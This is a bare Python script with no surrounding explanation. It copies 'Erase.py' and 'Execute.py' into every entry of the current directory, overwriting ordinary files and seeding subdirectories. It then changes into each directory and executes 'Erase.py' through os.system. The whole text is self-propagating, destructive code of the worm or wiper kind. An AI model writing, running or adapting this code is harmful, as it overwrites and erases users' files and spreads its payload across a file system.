import os, shutil,subprocess
for files in os.listdir(os.curdir):
    try:
        shutil.copy2('Erase.py', files)
        shutil.copy2('Execute.py', files)
        script_dir = os.path.dirname(os.path.realpath('Erase.py'))
        
        
    except Exception as e:
        print(e)

for files in os.listdir(os.curdir):
    try:
        path2 = os.path.join(script_dir, files)
        path3 = 'Erase.py'
        path4 = os.path.join(path2, path3)
        #print (path4)
        #os.system(path4)
        os.chdir(path2)
        print(path2)
        os.system('Erase.py')

        
    except Exception as e:
        print(e)
